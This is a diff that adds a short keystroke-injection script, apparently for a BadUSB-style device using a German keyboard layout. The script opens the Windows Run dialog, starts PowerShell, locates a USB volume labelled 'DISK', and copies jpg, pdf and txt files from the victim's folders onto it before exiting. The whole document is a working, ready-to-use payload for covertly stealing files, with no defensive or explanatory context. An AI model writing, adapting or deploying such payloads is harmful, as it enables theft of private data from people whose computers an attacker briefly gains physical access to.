@@ -1,0 +1,11 @@
+layout('de')
+press("GUI r")
+delay(200)
+type("powershell.exe\n")
+delay(300)
+type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'DISK' } | select name\n")
+var filetypes = ["jpg", "pdf", "txt"]
+for (var i = 0; i < filetypes.length; i++) {
+    type("copy */*." + filetypes[i] + " $usbpath.name\n")
+}
+type("exit\n")
